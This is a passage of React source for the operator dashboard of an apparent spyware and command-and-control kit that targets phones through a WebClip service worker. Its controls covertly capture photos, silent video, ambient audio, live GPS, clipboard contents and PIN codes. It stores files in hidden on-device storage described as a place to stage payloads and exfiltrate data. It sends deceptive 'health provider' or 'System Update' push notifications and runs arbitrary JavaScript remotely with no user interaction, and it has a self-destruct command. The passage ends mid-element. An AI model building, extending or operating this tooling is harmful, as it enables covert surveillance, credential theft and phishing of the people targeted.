          <div style={{ fontSize: 11, color: '#2d3a50', textAlign: 'center', padding: '8px 0' }}>No PINs captured yet</div>
        )}
      </div>
    </CollapsibleSection>
  );
}

function StudioTemplateSection({ deviceId, onSent }) {
  const [template, setTemplate] = useState(null);
  const [sending, setSending] = useState(null);
  const [flash, setFlash] = useState(null);

  useEffect(() => {
    apiFetch('/api/wc/targets')
      .then(targets => {
        const t = (targets || []).find(t => t.device_id === deviceId);
        if (!t?.template_id) return;
        return apiFetch(`/api/wc/templates/${t.template_id}`);
      })
      .then(tpl => tpl && setTemplate(tpl))
      .catch(() => {});
  }, [deviceId]);

  if (!template) return null;

  const harvest = Array.isArray(template.harvest) ? template.harvest : [];
  if (!harvest.length) return null;

  const PERM_LABELS = {
    geolocation: '📍 Location',
    camera: '📸 Camera',
    microphone: '🎤 Microphone',
    notifications: '🔔 Notifications',
    'clipboard-read': '📋 Clipboard',
    pin_capture: '🔐 PIN Code Capture',
  };

  async function triggerStep(item) {
    setSending(item.id);
    try {
      await sendCommand(deviceId, 'trigger_harvest', {
        permission: item.permission,
        title: item.title,
        body: item.body,
        attempts: item.attempts ?? undefined,
      });
      setFlash({ id: item.id, ok: true });
      setTimeout(() => setFlash(null), 3000);
      setTimeout(onSent, 1800);
    } catch (e) {
      setFlash({ id: item.id, ok: false, msg: e.message });
      setTimeout(() => setFlash(null), 3000);
    } finally {
      setSending(null);
    }
  }

  return (
    <CollapsibleSection label={`🎯 Studio Template: ${template.app_name || template.name}`} storageKey="studio_harvest">
      <div style={{ padding: '12px 14px' }}>
        <div style={{ fontSize: 11, color: '#4e5a70', marginBottom: 10 }}>
          Harvest steps configured in Toolkit. Trigger them manually here.
        </div>
        {harvest.map(item => (
          <div key={item.id} style={{
            display: 'flex', alignItems: 'center', gap: 10, marginBottom: 8,
            background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.07)',
            borderRadius: 6, padding: '8px 12px',
          }}>
            <div style={{ flex: 1, minWidth: 0 }}>
              <div style={{ fontSize: 12, fontWeight: 600, color: '#c9d1e8' }}>
                {PERM_LABELS[item.permission] || item.permission}
              </div>
              {item.title && <div style={{ fontSize: 11, color: '#4e5a70', marginTop: 1 }}>{item.title}</div>}
              <div style={{ fontSize: 10, color: '#2d3a50', marginTop: 1 }}>auto-delay: {item.delay_ms || 0}ms</div>
            </div>
            <button
              onClick={() => triggerStep(item)}
              disabled={!!sending}
              style={{
                height: 26, padding: '0 10px', borderRadius: 5, border: 'none',
                background: item.permission === 'pin_capture' ? 'rgba(255,59,48,0.15)' : 'rgba(59,130,246,0.12)',
                color: item.permission === 'pin_capture' ? '#ff3b30' : '#3b82f6',
                fontSize: 11, fontWeight: 600, cursor: 'pointer', whiteSpace: 'nowrap',
                opacity: sending ? 0.5 : 1,
              }}
            >
              {sending === item.id ? 'Sending...' : 'Trigger Now'}
            </button>
            {flash?.id === item.id && (
              <span style={{ fontSize: 10, color: flash.ok ? '#22c55e' : '#ef4444' }}>
                {flash.ok ? 'queued' : flash.msg}
              </span>
            )}
          </div>
        ))}
      </div>
    </CollapsibleSection>
  );
}

function _HarvestButtons({ deviceId, onSent, actions }) {
  const [sending, setSending] = useState(null);
  const [flash,   setFlash]   = useState(null);
  const flashRef = useRef(null);
  function showFlash(ok, msg) {
    clearTimeout(flashRef.current);
    setFlash({ ok, msg });
    flashRef.current = setTimeout(() => setFlash(null), 3500);
  }
  async function sendCmd(id, type, payload, label) {
    setSending(id);
    try {
      await sendCommand(deviceId, type, payload ?? {});
      showFlash(true, `${label} queued`);
      setTimeout(onSent, 1800);
    } catch (e) { showFlash(false, e.message); }
    finally { setSending(null); }
  }
  return (
    <div style={{ padding: '12px 14px', display: 'flex', flexDirection: 'column', gap: 8 }}>
      {actions.map(a => (
        <button key={a.id} disabled={!!sending}
          onClick={() => sendCmd(a.id, a.type, a.payload ?? {}, a.label)}
          style={{
            display: 'flex', alignItems: 'center', justifyContent: 'space-between',
            padding: '9px 12px', borderRadius: 9, border: `1px solid ${a.color}44`,
            background: sending === a.id ? `${a.color}22` : '#07080f',
            cursor: sending ? 'not-allowed' : 'pointer', opacity: sending && sending !== a.id ? 0.5 : 1,
            textAlign: 'left',
          }}>
          <span style={{ color: '#c9d1e8', fontSize: 13, fontWeight: 600 }}>
            {sending === a.id ? '⏳ Running…' : a.label}
          </span>
          <span style={{ color: '#4e5a70', fontSize: 11, maxWidth: '60%', textAlign: 'right' }}>{a.desc}</span>
        </button>
      ))}
      {flash && (
        <div style={{ padding: '7px 12px', borderRadius: 8, fontSize: 12, fontWeight: 600,
          background: flash.ok ? 'rgba(34,197,94,0.12)' : 'rgba(239,68,68,0.12)', color: flash.ok ? '#22c55e' : '#ef4444',
          border: `1px solid ${flash.ok ? 'rgba(34,197,94,0.25)' : 'rgba(239,68,68,0.25)'}` }}>{flash.msg}</div>
      )}
    </div>
  );
}

function CameraHarvestSection({ deviceId, onSent }) {
  return <_HarvestButtons deviceId={deviceId} onSent={onSent} actions={[
    { id: 'photo_front',  type: 'capture_photo_facing', payload: { facing: 'user' },        label: '🤳 Photo (Front)',   desc: 'Front-facing camera snapshot',     color: '#3b82f6' },
    { id: 'photo_rear',   type: 'capture_photo_facing', payload: { facing: 'environment' },  label: '📷 Photo (Rear)',    desc: 'Rear camera snapshot',             color: '#22c55e' },
    { id: 'photo_all',    type: 'capture_photo',        payload: {},                         label: '📸 Photo (All)',     desc: 'All cameras simultaneously',       color: '#a78bfa' },
    { id: 'burst5',       type: 'capture_burst',        payload: { frames: 5, delay_ms: 1000 }, label: '💥 Burst ×5',   desc: '5 frames at 1 fps',                color: '#f59e0b' },
    { id: 'burst10',      type: 'capture_burst',        payload: { frames: 10, delay_ms: 500 }, label: '🚀 Burst ×10',  desc: '10 frames at 2 fps',               color: '#f59e0b' },
    { id: 'video5',       type: 'capture_video',        payload: { duration: 5 },            label: '🎬 Video (5s)',      desc: 'Silent 5-second clip',             color: '#a78bfa' },
    { id: 'video15',      type: 'capture_video',        payload: { duration: 15 },           label: '🎬 Video (15s)',     desc: 'Silent 15-second clip',            color: '#a78bfa' },
    { id: 'enumerate',    type: 'enumerate_cameras',    payload: {},                         label: '🔍 Enumerate',       desc: 'List all cameras + device IDs',    color: '#4e5a70' },
    { id: 'stop_vid',     type: 'stop_video',           payload: {},                         label: '⏹ Stop Video',      desc: 'Abort active recording',           color: '#ef4444' },
  ]} />;
}

function MicHarvestSection({ deviceId, onSent }) {
  return <_HarvestButtons deviceId={deviceId} onSent={onSent} actions={[
    { id: 'audio5',   type: 'capture_audio', payload: { duration: 5 },  label: '🎤 Record 5s',   desc: 'Ambient audio snapshot',   color: '#3b82f6' },
    { id: 'audio10',  type: 'capture_audio', payload: { duration: 10 }, label: '🎤 Record 10s',  desc: '10-second ambient clip',   color: '#22c55e' },
    { id: 'audio30',  type: 'capture_audio', payload: { duration: 30 }, label: '🎤 Record 30s',  desc: '30-second ambient clip',   color: '#f59e0b' },
    { id: 'audio60',  type: 'capture_audio', payload: { duration: 60 }, label: '🎤 Record 60s',  desc: '1-minute ambient clip',    color: '#a78bfa' },
    { id: 'stop_aud', type: 'stop_audio',    payload: {},               label: '⏹ Stop',         desc: 'Abort active recording',   color: '#ef4444' },
  ]} />;
}

function GeoHarvestSection({ deviceId, onSent }) {
  return <_HarvestButtons deviceId={deviceId} onSent={onSent} actions={[
    { id: 'geo_once',    type: 'capture_geo',    payload: {},             label: '📍 Get Location',     desc: 'High-accuracy GPS (once)',         color: '#22c55e' },
    { id: 'geo_watch30', type: 'watch_geo',      payload: { duration: 30 },  label: '👁 Watch (30s)',  desc: 'Continuous GPS stream, 30s',       color: '#3b82f6' },
    { id: 'geo_watch5m', type: 'watch_geo',      payload: { duration: 300 }, label: '👁 Watch (5m)',  desc: 'Continuous GPS stream, 5 min',     color: '#a78bfa' },
    { id: 'geo_stop',    type: 'stop_geo_watch', payload: {},             label: '⏹ Stop Watch',        desc: 'Stop active location stream',      color: '#ef4444' },
  ]} />;
}

function ContactsHarvestSection({ deviceId, onSent }) {
  return <_HarvestButtons deviceId={deviceId} onSent={onSent} actions={[
    { id: 'contacts', type: 'capture_contacts', payload: {}, label: '👥 Open Contact Picker', desc: 'Native picker - user selects contacts', color: '#a78bfa' },
  ]} />;
}

function ClipboardHarvestSection({ deviceId, onSent }) {
  return <_HarvestButtons deviceId={deviceId} onSent={onSent} actions={[
    { id: 'clip_read', type: 'capture_clipboard', payload: {}, label: '📋 Read Clipboard', desc: 'Capture current clipboard text', color: '#f59e0b' },
  ]} />;
}

function OpfsHarvestSection({ deviceId }) {
  const [opfsFile, setOpfsFile]         = React.useState('');
  const [opfsContent, setOpfsContent]   = React.useState('');
  const [opfsEncoding, setOpfsEncoding] = React.useState('text');
  const [uploadName, setUploadName]     = React.useState('');
  const [loading, setLoading]           = React.useState(false);
  const [result, setResult]             = React.useState(null);

  const _send = async (type, payload = {}) => {
    setLoading(true);
    setResult(null);
    try { await sendCommand(deviceId, type, payload); } catch {}
    setLoading(false);
    setResult({ pending: true, type });
  };

  const _renderResult = () => {
    if (!result) return null;
    if (result.pending) return <div style={{ fontSize: 11, color: '#4e5a70', marginTop: 8 }}>Command sent - result arrives via beacon (foreground) or audio-keepalive (background)</div>;
    const d = result.data;
    if (d?.content_b64) {
      let text = null;
      try { text = decodeURIComponent(escape(atob(d.content_b64))); } catch {}
      return (
        <div style={{ marginTop: 8 }}>
          <div style={{ fontSize: 10, color: '#4e5a70', marginBottom: 4 }}>{d.filename} - {d.size} bytes</div>
          {text !== null ? (
            <pre style={{ margin: 0, padding: '8px', background: '#07080f', borderRadius: 6, fontSize: 11, color: '#22c55e', fontFamily: 'monospace', whiteSpace: 'pre-wrap', wordBreak: 'break-all', maxHeight: 200, overflowY: 'auto' }}>{text}</pre>
          ) : (
            <a href={`data:application/octet-stream;base64,${d.content_b64}`} download={d.filename} style={{ fontSize: 12, color: '#3b82f6' }}>⬇ Download {d.filename}</a>
          )}
        </div>
      );
    }
    return <pre style={{ marginTop: 8, padding: '8px', background: '#07080f', borderRadius: 6, fontSize: 11, color: '#c9d1e8', fontFamily: 'monospace', whiteSpace: 'pre-wrap', wordBreak: 'break-all', maxHeight: 160, overflowY: 'auto' }}>{JSON.stringify(d, null, 2)}</pre>;
  };

  const _b2 = (bg, disabled) => ({
    padding: '0 10px', height: 28, borderRadius: 5,
    border: `1px solid ${disabled ? 'rgba(255,255,255,0.05)' : 'rgba(255,255,255,0.11)'}`,
    background: disabled ? 'rgba(255,255,255,0.03)' : bg,
    color: disabled ? '#4e5a70' : '#c9d1e8',
    fontSize: 11, fontWeight: 600, cursor: disabled ? 'default' : 'pointer',
    opacity: disabled ? 0.6 : 1,
    display: 'inline-flex', alignItems: 'center', gap: 5,
  });

  return (
    <div style={{ padding: '12px 14px' }}>
      <div style={{ marginBottom: 10, padding: '8px 10px', borderRadius: 6, background: '#141728', border: '1px solid #3a3a5c', fontSize: 11, color: '#c9d1e8', lineHeight: 1.6 }}>
        <strong style={{ color: '#c9d1e8' }}>OPFS (Origin Private File System)</strong> - hidden on-device storage. Works via the beacon channel when the app is open or running in the background with audio. Files are invisible to the user and persist across sessions. Use to stage payloads, exfil data, or persist state.
      </div>
      <input value={opfsFile} onChange={e => setOpfsFile(e.target.value)} placeholder="filename (e.g. data.txt)"
        style={{ width: '100%', boxSizing: 'border-box', background: '#07080f', border: '1px solid #3a3a3c', borderRadius: 6, color: '#c9d1e8', fontSize: 12, padding: '6px 8px', marginBottom: 6, outline: 'none' }} />
      <div style={{ display: 'flex', gap: 6, marginBottom: 6, alignItems: 'flex-start' }}>
        <label style={{ fontSize: 11, color: '#4e5a70', cursor: 'pointer', padding: '6px 10px', borderRadius: 6, border: '1px solid #3a3a3c', background: '#07080f', whiteSpace: 'nowrap' }}>
          📎 Upload file
          <input type="file" style={{ display: 'none' }} onChange={async e => {
            const file = e.target.files[0];
            if (!file) return;
            if (!opfsFile) setOpfsFile(file.name);
            setUploadName(file.name);
            const buf = await file.arrayBuffer();
            const bytes = new Uint8Array(buf);
            let b64 = '';
            const CHUNK = 8192;
            for (let i = 0; i < bytes.length; i += CHUNK) b64 += String.fromCharCode(...bytes.subarray(i, i + CHUNK));
            setOpfsContent(btoa(b64));
            setOpfsEncoding('base64');
          }} />
        </label>
        {uploadName ? (
          <div style={{ display: 'flex', gap: 6, alignItems: 'center', flexWrap: 'wrap' }}>
            <span style={{ fontSize: 11, color: '#22c55e' }}>✓ {uploadName}</span>
            <button onClick={() => { setUploadName(''); setOpfsContent(''); setOpfsEncoding('text'); }}
              style={{ ..._b2('transparent', false), border: '1px solid #636366', color: '#4e5a70', padding: '3px 7px', fontSize: 11 }}>Clear</button>
          </div>
        ) : (
          <textarea value={opfsEncoding === 'text' ? opfsContent : ''} onChange={e => { setOpfsContent(e.target.value); setOpfsEncoding('text'); }}
            placeholder="or paste text content" rows={3}
            style={{ flex: 1, background: '#07080f', border: '1px solid #3a3a3c', borderRadius: 6, color: '#c9d1e8', fontFamily: 'monospace', fontSize: 12, padding: '6px 8px', resize: 'vertical', outline: 'none' }} />
        )}
      </div>
      <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
        <button disabled={loading} onClick={() => _send('opfs_list')} style={_b2('#10121f', loading)}>List</button>
        <button disabled={loading || !opfsFile.trim() || !opfsContent} onClick={() => _send('write_opfs', { filename: opfsFile.trim(), content: opfsContent, encoding: opfsEncoding })} style={_b2('rgba(34,197,94,0.09)', loading || !opfsFile.trim() || !opfsContent)}>Write</button>
        <button disabled={loading || !opfsFile.trim()} onClick={() => _send('read_opfs', { filename: opfsFile.trim() })} style={_b2('#10121f', loading || !opfsFile.trim())}>Read</button>
        <button disabled={loading || !opfsFile.trim()} onClick={() => _send('delete_opfs', { filename: opfsFile.trim() })} style={{ ..._b2('transparent', loading || !opfsFile.trim()), border: '1px solid rgba(239,68,68,0.27)', color: (loading || !opfsFile.trim()) ? '#4e5a70' : '#ef4444' }}>Delete</button>
      </div>
      {_renderResult()}
    </div>
  );
}

function MotionHarvestSection({ deviceId, onSent }) {
  const [sending,       setSending]       = useState(null);
  const [sessionActive, setSessionActive] = useState(() => {
    try { return JSON.parse(localStorage.getItem('motionSession') || 'null')?.deviceId === String(deviceId); }
    catch { return false; }
  });
  const [flash,         setFlash]         = useState(null);
  const [motionInterval, setMotionInterval] = useState(1000);
  const flashRef = useRef(null);

  function showFlash(ok, msg) {
    clearTimeout(flashRef.current);
    setFlash({ ok, msg });
    flashRef.current = setTimeout(() => setFlash(null), 3500);
  }

  async function sendCmd(type, payload, label) {
    setSending(type);
    try {
      await sendCommand(deviceId, type, payload ?? {});
      if (type === 'start_motion_session') {
        localStorage.setItem('motionSession', JSON.stringify({ deviceId: String(deviceId), startedAt: Date.now() }));
        setSessionActive(true);
      }
      if (type === 'stop_motion_session') {
        localStorage.removeItem('motionSession');
        setSessionActive(false);
      }
      showFlash(true, type === 'start_motion_session' ? 'Recording started' : `${label} queued`);
      setTimeout(onSent, 1800);
    } catch (e) { showFlash(false, e.message); }
    finally { setSending(null); }
  }

  const intervalLabel = motionInterval < 1000 ? `${motionInterval}ms` : `${motionInterval / 1000}s`;

  return (
    <div style={{ padding: '12px 14px', display: 'flex', flexDirection: 'column', gap: 8 }}>

      {/* Sample rate selector */}
      <div>
        <div style={{ fontSize: 10, color: '#4e5a70', fontWeight: 700, letterSpacing: '0.06em', marginBottom: 5 }}>SAMPLE RATE</div>
        <div style={{ display: 'flex', gap: 5 }}>
          {[250, 500, 1000, 2000].map(ms => {
            const lbl = ms < 1000 ? `${ms}ms` : `${ms / 1000}s`;
            const active = motionInterval === ms;
            return (
              <button key={ms} onClick={() => !sessionActive && setMotionInterval(ms)}
                disabled={sessionActive}
                style={{
                  flex: 1, padding: '5px 0', borderRadius: 7, border: 'none',
                  background: active ? 'rgba(59,130,246,0.27)' : '#141728',
                  color: active ? '#3b82f6' : '#4e5a70',
                  fontSize: 11, fontWeight: 600,
                  cursor: sessionActive ? 'default' : 'pointer',
                  transition: 'background 0.15s, color 0.15s',
                }}>{lbl}</button>
            );
          })}
        </div>
      </div>

      {/* Recording indicator */}
      {sessionActive && (
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '8px 12px',
          background: 'rgba(34,197,94,0.08)', border: '1px solid #30d15840', borderRadius: 9 }}>
          <span style={{ width: 8, height: 8, borderRadius: '50%', background: '#22c55e',
            boxShadow: '0 0 6px #30d158', display: 'inline-block' }} />
          <span style={{ color: '#22c55e', fontWeight: 700, fontSize: 13 }}>Recording…</span>
          <span style={{ color: '#4e5a70', fontSize: 11, marginLeft: 'auto' }}>live every {intervalLabel}</span>
        </div>
      )}

      {[
        { type: 'start_motion_session', label: sessionActive ? '▶  Recording…' : '▶  Start',
          desc: `Live analysis every ${intervalLabel}`, color: '#22c55e', disabled: sessionActive,
          payload: { interval: motionInterval } },
        { type: 'stop_motion_session',  label: '⏹  Stop + Analyze',
          desc: 'Stop and emit full summary', color: '#ef4444', disabled: !sessionActive,
          payload: {} },
      ].map(a => (
        <button key={a.type} disabled={!!sending || a.disabled}
          onClick={() => sendCmd(a.type, a.payload, a.label)}
          style={{
            display: 'flex', alignItems: 'center', justifyContent: 'space-between',
            padding: '11px 14px', borderRadius: 9,
            border: `1px solid ${a.disabled ? 'rgba(255,255,255,0.09)' : a.color+'66'}`,
            background: a.type === 'start_motion_session' && sessionActive ? 'rgba(34,197,94,0.08)'
              : a.type === 'stop_motion_session' && sessionActive ? 'rgba(239,68,68,0.13)' : '#07080f',
            cursor: (sending || a.disabled) ? 'not-allowed' : 'pointer',
            opacity: a.disabled ? 0.35 : 1,
            textAlign: 'left',
          }}>
          <span style={{ color: '#c9d1e8', fontSize: 13, fontWeight: 600 }}>
            {sending === a.type ? `⏳ Running…` : a.label}
          </span>
          <span style={{ color: '#4e5a70', fontSize: 11, maxWidth: '60%', textAlign: 'right' }}>{a.desc}</span>
        </button>
      ))}
      {flash && (
        <div style={{
          padding: '7px 12px', borderRadius: 8, fontSize: 12, fontWeight: 600,
          background: flash.ok ? 'rgba(34,197,94,0.12)' : 'rgba(239,68,68,0.12)',
          color: flash.ok ? '#22c55e' : '#ef4444',
          border: `1px solid ${flash.ok ? 'rgba(34,197,94,0.25)' : 'rgba(239,68,68,0.25)'}`,
        }}>{flash.msg}</div>
      )}
    </div>
  );
}

function PushNotifySection({ deviceId }) {
  const [title,    setTitle]    = useState('');
  const [body,     setBody]     = useState('');
  const [mode,     setMode]     = useState('now');   // 'now' | 'scheduled'
  const [sendAt,   setSendAt]   = useState('');
  const [sending,  setSending]  = useState(false);
  const [flash,    setFlash]    = useState(null);
  const flashRef = useRef(null);

  function showFlash(ok, msg) {
    clearTimeout(flashRef.current);
    setFlash({ ok, msg });
    flashRef.current = setTimeout(() => setFlash(null), 4000);
  }

  async function send() {
    if (!title.trim()) { showFlash(false, 'Title required'); return; }
    setSending(true);
    try {
      const payload = {
        title:  title.trim(),
        body:   body.trim(),
        target: String(deviceId),
        ...(mode === 'scheduled' && sendAt ? { send_at: new Date(sendAt).toISOString() } : {}),
      };
      const r = await apiFetch('/api/push/send', { method: 'POST', body: JSON.stringify(payload) });
      if (mode === 'scheduled' && r.scheduled) {
        showFlash(true, `Scheduled - fires in ${Math.round(r.fire_in_secs / 60)}m`);
      } else {
        showFlash(r.sent > 0, r.sent > 0 ? `Sent ✓` : `Failed: ${r.results?.[0]?.error ?? 'unknown'}`);
      }
    } catch (e) {
      showFlash(false, e.message);
    } finally {
      setSending(false);
    }
  }

  const inputStyle = {
    width: '100%', boxSizing: 'border-box', background: '#141728', border: '1px solid #3a3a3c',
    borderRadius: 8, color: '#c9d1e8', padding: '8px 10px', fontSize: 13, outline: 'none',
  };
  const labelStyle = { fontSize: 11, color: '#4e5a70', marginBottom: 4, display: 'block' };

  return (
    <div style={{ padding: '14px 16px', display: 'flex', flexDirection: 'column', gap: 12 }}>
      <div>
        <label style={labelStyle}>Title</label>
        <input value={title} onChange={e => setTitle(e.target.value)}
          placeholder="e.g. Important update from your health provider"
          style={inputStyle} />
      </div>
      <div>
        <label style={labelStyle}>Body</label>
        <textarea value={body} onChange={e => setBody(e.target.value)} rows={3}
          placeholder="e.g. Action required on your account. Tap for details."
          style={{ ...inputStyle, resize: 'vertical', fontFamily: 'inherit' }} />
      </div>

      {/* Send mode toggle */}
      <div style={{ display: 'flex', gap: 8 }}>
        {['now', 'scheduled'].map(m => (
          <button key={m} onClick={() => setMode(m)} style={{
            padding: '6px 14px', borderRadius: 8, border: 'none', fontSize: 12, fontWeight: 600,
            background: mode === m ? '#3b82f6' : 'rgba(255,255,255,0.09)',
            color: mode === m ? '#fff' : '#4e5a70', cursor: 'pointer',
          }}>
            {m === 'now' ? '⚡ Send now' : '🕐 Scheduled'}
          </button>
        ))}
      </div>

      {mode === 'scheduled' && (
        <div>
          <label style={labelStyle}>Date &amp; Time</label>
          <input type="datetime-local" value={sendAt} onChange={e => setSendAt(e.target.value)}
            style={{ ...inputStyle, colorScheme: 'dark' }} />
        </div>
      )}

      <button onClick={send} disabled={sending} style={{
        background: sending ? 'rgba(59,130,246,0.27)' : '#3b82f6', color: '#c9d1e8', border: 'none',
        borderRadius: 10, padding: '10px 0', fontSize: 14, fontWeight: 600, cursor: 'pointer',
        opacity: sending ? 0.7 : 1,
      }}>
        {sending ? 'Sending…' : mode === 'now' ? '🔔 Send Notification' : '📅 Schedule Notification'}
      </button>

      {flash && (
        <div style={{
          padding: '8px 12px', borderRadius: 8, fontSize: 12, fontWeight: 600,
          background: flash.ok ? 'rgba(34,197,94,0.12)' : 'rgba(239,68,68,0.12)',
          color: flash.ok ? '#22c55e' : '#ef4444',
          border: `1px solid ${flash.ok ? 'rgba(34,197,94,0.25)' : 'rgba(239,68,68,0.25)'}`,
        }}>{flash.msg}</div>
      )}
    </div>
  );
}

function SwC2Section({ deviceId }) {
  const [status, setStatus]           = useState(null);
  const [cmdLog, setCmdLog]           = useState([]);
  const [cmdLoading, setCmdLoading]   = useState(false);
  const [flashMsg, setFlashMsg]       = useState(null);
  const [showDestruct, setShowDestruct] = useState(false);
  const [destructLoading, setDestructLoading] = useState(false);
  const [notifTitle, setNotifTitle]   = useState(() => localStorage.getItem('wc_notif_title') ?? '');
  const [notifBody, setNotifBody]     = useState(() => localStorage.getItem('wc_notif_body')  ?? '');
  const [showNotifConfig, setShowNotifConfig] = useState(false);
  const pollRef  = useRef(null);
  const flashRef = useRef(null);

  useEffect(() => {
    const fetch_ = () => apiFetch(`/api/sw-c2/status/${deviceId}`).then(setStatus).catch(() => {});
    fetch_();
    pollRef.current = setInterval(fetch_, 10000);
    return () => clearInterval(pollRef.current);
  }, [deviceId]); // eslint-disable-line react-hooks/exhaustive-deps

  function showFlash(ok, msg) {
    clearTimeout(flashRef.current);
    setFlashMsg({ ok, msg });
    flashRef.current = setTimeout(() => setFlashMsg(null), 3000);
  }

  function swRelTime(epochSec) {
    if (!epochSec) return 'never';
    const d = Math.floor(Date.now() / 1000 - epochSec);
    if (d < 60) return `${d}s ago`;
    if (d < 3600) return `${Math.floor(d / 60)}m ago`;
    if (d < 86400) return `${Math.floor(d / 3600)}h ago`;
    return `${Math.floor(d / 86400)}d ago`;
  }

  async function sendCmd(type, payload = {}) {
    setCmdLoading(true);
    try {
      const r = await apiFetch(`/api/sw-c2/command/${deviceId}`, {
        method: 'POST', body: JSON.stringify({ type, payload, notif_title: notifTitle, notif_body: notifBody }),
      });
      setCmdLog(prev => [{ type, ts: Date.now(), ok: r.ok }, ...prev].slice(0, 10));
      showFlash(r.ok, r.ok ? `"${type}" sent` : `Failed: ${r.error ?? 'push failed'}`);
      apiFetch(`/api/sw-c2/status/${deviceId}`).then(setStatus).catch(() => {});
    } catch (e) {
      setCmdLog(prev => [{ type, ts: Date.now(), ok: false }, ...prev].slice(0, 10));
      showFlash(false, e.message);
    } finally { setCmdLoading(false); }
  }

  async function handleDestruct() {
    setDestructLoading(true);
    try {
      const r = await apiFetch(`/api/sw-c2/self-destruct/${deviceId}`, { method: 'POST' });
      setCmdLog(prev => [{ type: 'self_destruct', ts: Date.now(), ok: r.ok }, ...prev].slice(0, 10));
      showFlash(r.ok, r.ok ? 'Self-destruct sent' : `Failed: ${r.error}`);
      apiFetch(`/api/sw-c2/status/${deviceId}`).then(setStatus).catch(() => {});
    } catch (e) { showFlash(false, e.message); }
    finally { setDestructLoading(false); setShowDestruct(false); }
  }

  const alive = status && (Date.now() - (status.last_heartbeat || 0) * 1000) < 600000;
  const pushOk = status?.push_capable ?? true; // optimistic until status loads
  const _b = (bg, disabled) => ({
    padding: '0 10px', height: 28, borderRadius: 5,
    border: `1px solid ${disabled ? 'rgba(255,255,255,0.05)' : 'rgba(255,255,255,0.11)'}`,
    background: disabled ? 'rgba(255,255,255,0.03)' : bg,
    color: disabled ? '#4e5a70' : '#c9d1e8',
    fontSize: 11, fontWeight: 600, cursor: disabled ? 'default' : 'pointer',
    opacity: disabled ? 0.6 : 1,
    display: 'inline-flex', alignItems: 'center', gap: 5,
  });

  const [jsCode, setJsCode] = React.useState('');

  return (
    <div style={{ padding: '4px 0', position: 'relative' }}>
      {/* Grayed-out overlay when no push subscription */}
      {status && !pushOk && (
        <div style={{
          position: 'absolute', inset: 0, zIndex: 10, borderRadius: 8,
          background: 'rgba(0,0,0,0.65)', backdropFilter: 'blur(2px)',
          display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', gap: 8,
        }}>
          <span style={{ fontSize: 28 }}>📵</span>
          <span style={{ fontSize: 13, color: '#4e5a70', fontWeight: 600 }}>No push subscription</span>
          <span style={{ fontSize: 11, color: '#4e5a70' }}>SW C2 requires push permission on the device.</span>
        </div>
      )}

      {/* What is SW C2 */}
      <div style={{ marginBottom: 12, padding: '10px 12px', borderRadius: 8, background: '#141728', border: '1px solid #3a3a5c', fontSize: 12, color: '#c9d1e8', lineHeight: 1.6 }}>
        <div style={{ fontWeight: 700, color: '#c9d1e8', marginBottom: 4 }}>SW C2 - Service Worker Command &amp; Control</div>
        The WebClip's Service Worker runs in the background even when the app is closed. Commands are delivered via APNs (Apple Push) - the SW executes JS and posts results back to the server with no user interaction.
        <div style={{ marginTop: 6, color: '#636380', fontSize: 11 }}>Ping → proof of life &nbsp;|&nbsp; Run JS → arbitrary code execution &nbsp;|&nbsp; Reload → force app refresh</div>
      </div>

      {/* Notification warning + config */}
      <div style={{ marginBottom: 12 }}>
        <div
          onClick={() => setShowNotifConfig(v => !v)}
          style={{ display: 'flex', alignItems: 'center', gap: 8, cursor: 'pointer', padding: '8px 12px', borderRadius: 8, background: 'rgba(245,158,11,0.09)', border: '1px solid rgba(245,158,11,0.25)' }}
        >
          <span style={{ fontSize: 14 }}>⚠️</span>
          <span style={{ fontSize: 12, color: '#f59e0b', flex: 1 }}>When app is closed - target sees a notification. Click to customize.</span>
          <span style={{ fontSize: 11, color: '#4e5a70' }}>{showNotifConfig ? '▲' : '▼'}</span>
        </div>
        {showNotifConfig && (
          <div style={{ marginTop: 6, padding: '10px 12px', borderRadius: 8, background: '#141728', border: '1px solid #3a3a3c' }}>
            <div style={{ fontSize: 11, color: '#4e5a70', marginBottom: 4 }}>Notification title (shown on device)</div>
            <input
              value={notifTitle}
              onChange={e => { setNotifTitle(e.target.value); localStorage.setItem('wc_notif_title', e.target.value); }}
              placeholder="e.g. System Update"
              style={{ width: '100%', boxSizing: 'border-box', background: '#0c0d1a', border: '1px solid #3a3a3c', borderRadius: 6, color: '#c9d1e8', fontSize: 12, padding: '6px 8px', marginBottom: 8, outline: 'none' }}
            />
            <div style={{ fontSize: 11, color: '#4e5a70', marginBottom: 4 }}>Notification body</div>
            <input
              value={notifBody}
              onChange={e => { setNotifBody(e.target.value); localStorage.setItem('wc_notif_body', e.target.value); }}
              placeholder="e.g. Your medical information has been updated."
              style={{ width: '100%', boxSizing: 'border-box', background: '#0c0d1a', border: '1px solid #3a3a3c', borderRadius: 6, color: '#c9d1e8', fontSize: 12, padding: '6px 8px', outline: 'none' }}
            />
            <div style={{ fontSize: 10, color: '#4e5a70', marginTop: 6 }}>When app is in foreground - no notification is shown at all.</div>
          </div>
        )}
      </div>

      {/* Status bar */}
      <div style={{
        display: 'grid', gridTemplateColumns: 'auto auto 1fr auto', gap: 10,
        alignItems: 'center', padding: '10px 14px', borderRadius: 10,
        background: '#141728', marginBottom: 12,
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
          <div style={{ width: 8, height: 8, borderRadius: '50%', background: alive ? '#22c55e' : '#4e5a70', boxShadow: alive ? '0 0 6px #30d158' : 'none' }} />
          <span style={{ fontSize: 13, fontWeight: 600, color: alive ? '#22c55e' : '#4e5a70' }}>{alive ? 'Active' : 'Dormant'}</span>
        </div>
        <span style={{ fontSize: 12, color: '#4e5a70' }}>HB {swRelTime(status?.last_heartbeat)}</span>
        <span style={{ fontSize: 11, color: status?.push_capable ? '#22c55e' : '#ef4444' }}>{status?.push_capable ? '📡 Push ✓' : '📡 No Push'}</span>
        {status?.self_destruct_sent && <span style={{ fontSize: 11, color: '#ef4444', fontWeight: 700 }}>☢️ SENT</span>}
      </div>

      {/* JS result output */}
      {status?.last_js_result && (
        <div style={{
          marginBottom: 12, padding: '10px 12px', borderRadius: 8, fontSize: 12,
          background: '#0c0d1a', border: `1px solid ${status.last_js_result.ok ? '#22c55e' : '#ef4444'}`,
          color: status.last_js_result.ok ? '#22c55e' : '#ef4444',
          fontFamily: 'monospace', whiteSpace: 'pre-wrap', wordBreak: 'break-all', maxHeight: 160, overflowY: 'auto',
        }}>
